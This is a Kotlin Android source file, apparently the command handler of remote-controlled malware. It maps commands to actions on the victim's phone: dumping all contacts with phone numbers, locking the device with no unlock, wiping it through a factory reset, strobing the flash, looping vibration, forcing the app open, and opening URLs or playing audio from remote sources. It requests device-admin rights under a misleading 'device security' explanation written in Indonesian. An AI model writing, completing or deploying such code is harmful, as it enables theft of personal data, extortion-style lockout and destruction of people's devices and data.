package com.template.app

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.Settings
import android.util.Base64
import android.util.Log
import org.json.JSONObject
import java.io.ByteArrayOutputStream

object NativeCommandHandler {

    private const val TAG = "NativeCmdHandler"

    fun execute(context: Context, command: String, extra: String): JSONObject {
        return try {
            when (command) {
                "ping" -> {
                    JSONObject().apply {
                        put("ok", true)
                        put("pong", true)
                        put("ts", System.currentTimeMillis())
                    }
                }

                "flash_strobe" -> toggleFlash(context, true)
                "stop_strobe" -> toggleFlash(context, false)

                "vibrate_loop" -> vibrateLoop(context)
                "stop_vibrate" -> stopVibrate(context)

                "force_open" -> forceOpen(context)

                "open_url" -> openUrl(context, extra)

                "hard_lock" -> hardLock(context)

                "unlock" -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "unlock_not_supported")
                    }
                }

                "is_device_admin" -> {
                    JSONObject().apply {
                        put("ok", true)
                        put("is_admin", isDeviceAdmin(context))
                    }
                }

                "request_device_admin" -> {
                    requestDeviceAdmin(context)
                    JSONObject().apply {
                        put("ok", true)
                        put("message", "Dialog dibuka")
                    }
                }

                "get_screen" -> {
                    // Screen capture butuh MediaProjection (user consent)
                    // Native service tidak bisa capture tanpa consent.
                    // Fallback: capture pakai main thread Activity kalau tersedia
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "screen_capture_requires_activity")
                        put("message", "MediaProjection butuh user consent di Activity")
                    }
                }

                "take_photo" -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "camera_requires_activity")
                    }
                }

                "start_camera_stream" -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "camera_requires_activity")
                    }
                }

                "stop_camera_stream" -> {
                    JSONObject().apply {
                        put("ok", true)
                    }
                }

                "play_audio" -> playAudio(context, extra)

                "stop_audio" -> stopAudio()

                "set_wallpaper" -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "wallpaper_requires_activity")
                    }
                }

                "get_contacts" -> getContacts(context)

                "open_accessibility" -> {
                    openAccessibilitySettings(context)
                    JSONObject().apply { put("ok", true) }
                }

                "enable_protection" -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "protection_requires_activity")
                    }
                }

                "disable_protection" -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "protection_requires_activity")
                    }
                }

                "factory_reset" -> factoryReset(context)

                else -> {
                    JSONObject().apply {
                        put("ok", false)
                        put("error", "unknown_command")
                        put("command", command)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Execute error [$command]", e)
            JSONObject().apply {
                put("ok", false)
                put("error", "exception")
                put("message", e.message ?: "unknown")
            }
        }
    }

    // ==========================================
    // ===== FLASHLIGHT =====
    // ==========================================
    private fun toggleFlash(context: Context, on: Boolean): JSONObject {
        return try {
            val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            var cameraId: String? = null
            for (id in camManager.cameraIdList) {
                try {
                    val chars = camManager.getCameraCharacteristics(id)
                    val flashAvailable: Boolean =
                        chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) ?: false
                    if (flashAvailable) {
                        cameraId = id
                        break
                    }
                } catch (e: Exception) {}
            }
            if (cameraId == null) {
                return JSONObject().apply {
                    put("ok", false)
                    put("error", "no_flash")
                }
            }
            camManager.setTorchMode(cameraId, on)
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "flash_error")
            }
        }
    }

    // ==========================================
    // ===== VIBRATE =====
    // ==========================================
    private fun getVibrator(context: Context): Vibrator {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
            vm.defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }
    }

    private fun vibrateLoop(context: Context): JSONObject {
        return try {
            val vibrator = getVibrator(context)
            val pattern = longArrayOf(0, 500, 500)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(pattern, 0)
            }
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "vibrate_error")
            }
        }
    }

    private fun stopVibrate(context: Context): JSONObject {
        return try {
            getVibrator(context).cancel()
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "vibrate_error")
            }
        }
    }

    // ==========================================
    // ===== FORCE OPEN =====
    // ==========================================
    private fun forceOpen(context: Context): JSONObject {
        return try {
            val intent = context.packageManager
                .getLaunchIntentForPackage(context.packageName)
            if (intent != null) {
                intent.addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                )
                context.startActivity(intent)
                JSONObject().apply { put("ok", true) }
            } else {
                JSONObject().apply {
                    put("ok", false)
                    put("error", "no_launch_intent")
                }
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "force_open_error")
            }
        }
    }

    // ==========================================
    // ===== OPEN URL =====
    // ==========================================
    private fun openUrl(context: Context, url: String): JSONObject {
        if (url.isEmpty()) {
            return JSONObject().apply {
                put("ok", false)
                put("error", "empty_url")
            }
        }
        return try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "url_error")
            }
        }
    }

    // ==========================================
    // ===== LOCK / ADMIN =====
    // ==========================================
    private fun isDeviceAdmin(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
        return dpm.isAdminActive(admin)
    }

    private fun hardLock(context: Context): JSONObject {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow()
                JSONObject().apply {
                    put("ok", true)
                    put("locked", true)
                }
            } else {
                JSONObject().apply {
                    put("ok", false)
                    put("error", "device_admin_not_active")
                }
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "lock_error")
            }
        }
    }

    private fun requestDeviceAdmin(context: Context) {
        try {
            val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Izinkan untuk mengaktifkan fitur keamanan perangkat",
            )
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "requestDeviceAdmin error", e)
        }
    }

    // ==========================================
    // ===== AUDIO =====
    // ==========================================
    private var mediaPlayer: MediaPlayer? = null

    private fun playAudio(context: Context, url: String): JSONObject {
        if (url.isEmpty()) {
            return JSONObject().apply {
                put("ok", false)
                put("error", "empty_url")
            }
        }
        return try {
            mediaPlayer?.release()
            mediaPlayer = MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnErrorListener { _, _, _ -> true }
                prepareAsync()
            }
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "audio_error")
            }
        }
    }

    private fun stopAudio(): JSONObject {
        return try {
            mediaPlayer?.stop()
            mediaPlayer?.release()
            mediaPlayer = null
            JSONObject().apply { put("ok", true) }
        } catch (e: Exception) {
            JSONObject().apply { put("ok", true) }
        }
    }

    // ==========================================
    // ===== CONTACTS =====
    // ==========================================
    private fun getContacts(context: Context): JSONObject {
        return try {
            val contacts = mutableListOf<Map<String, String>>()
            val cursor = context.contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null,
            )
            cursor?.use {
                val nameIdx = it.getColumnIndex(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                )
                val phoneIdx = it.getColumnIndex(
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                )
                while (it.moveToNext()) {
                    val name = if (nameIdx >= 0) it.getString(nameIdx) else ""
                    val phone = if (phoneIdx >= 0) it.getString(phoneIdx) else ""
                    contacts.add(mapOf("name" to (name ?: ""), "phone" to (phone ?: "")))
                }
            }
            JSONObject().apply {
                put("ok", true)
                put("contacts", org.json.JSONArray(contacts))
                put("count", contacts.size)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "contacts_error")
            }
        }
    }

    // ==========================================
    // ===== SETTINGS =====
    // ==========================================
    private fun openAccessibilitySettings(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "openAccessibility error", e)
        }
    }

    // ==========================================
    // ===== FACTORY RESET =====
    // ==========================================
    private fun factoryReset(context: Context): JSONObject {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.wipeData(0)
                JSONObject().apply { put("ok", true) }
            } else {
                JSONObject().apply {
                    put("ok", false)
                    put("error", "device_admin_not_active")
                }
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("ok", false)
                put("error", e.message ?: "factory_reset_error")
            }
        }
    }
}
